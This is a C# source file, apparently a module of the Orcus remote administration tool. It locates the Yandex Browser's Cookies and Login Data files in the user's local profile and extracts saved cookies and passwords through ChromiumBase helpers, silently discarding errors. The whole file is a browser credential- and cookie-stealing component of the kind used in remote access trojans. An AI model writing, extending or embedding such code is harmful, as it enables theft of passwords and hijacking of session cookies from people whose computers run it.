using System;
using System.Collections.Generic;
using System.IO;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Yandex;

internal class Yandex : ICookieRecovery, IPasswordRecovery
{
	private const string ApplicationName = "Yandex";

	public IEnumerable<RecoveredCookie> GetCookies()
	{
		try
		{
			return ChromiumBase.Cookies(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Default\\Cookies"), "Yandex");
		}
		catch (Exception)
		{
			return new List<RecoveredCookie>();
		}
	}

	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		try
		{
			return ChromiumBase.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Default\\Login Data"), "Yandex");
		}
		catch (Exception)
		{
			return new List<RecoveredPassword>();
		}
	}
}
